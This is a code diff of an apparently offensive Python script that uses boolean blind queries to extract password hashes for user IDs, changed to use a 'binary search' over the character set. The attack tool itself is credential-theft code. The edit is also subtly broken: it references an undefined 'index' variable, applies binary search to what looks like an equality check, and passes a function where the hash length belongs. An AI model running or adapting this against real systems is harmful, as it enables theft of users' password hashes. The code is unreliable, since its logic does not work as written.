@@ -47,13 +47,26 @@ def password_len(user_id):
 
 #if user is valid and password hash is present, let's extract the hash
 #iterating through characters in password_length to find the true character
-def extract_hash(charset, user_id, password_length):
+# updated to include a binary search to help lower the ammount of queries 
+def extract_hash(charset, user_id, password_len):
   found = ""
-  for i in range(0, password_length):
-    for j in range(len(charset)):
-      if boolean_query(i, user_id, charset[j]):
-        found += charset[j]
+  for i in range(0, password_len):
+    start = 0
+    end = len(charset) - 1
+    while start <= end:
+      if end - start == 1:
+        if start == 0 and boolean_query(index, user_id, charset[start]):
+          found += charset[start]
+        else:
+          found += charset[start +1]
         break
+      else:
+        middle = (start + end) // 2
+   # for j in range(len(charset)):
+        if boolean_query(index, user_id, charset[middle]):
+          end = middle
+        else:
+          start = middle
   return found 
 
 
@@ -74,7 +87,9 @@ while True:
       user_password_len = password_len(user_id)
       print("\t[-] User {} hash length: {}".format(user_id, user_password_len))
       total_queries_taken()
-      print("\t [-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_len)))
+      #print("\t [-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_len)))
+      #total_queries_taken()
+      print("\t [-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), password_len)))
       total_queries_taken()
     else:
       print("\t\t [X] User {} does not exist".format(user_id)) 
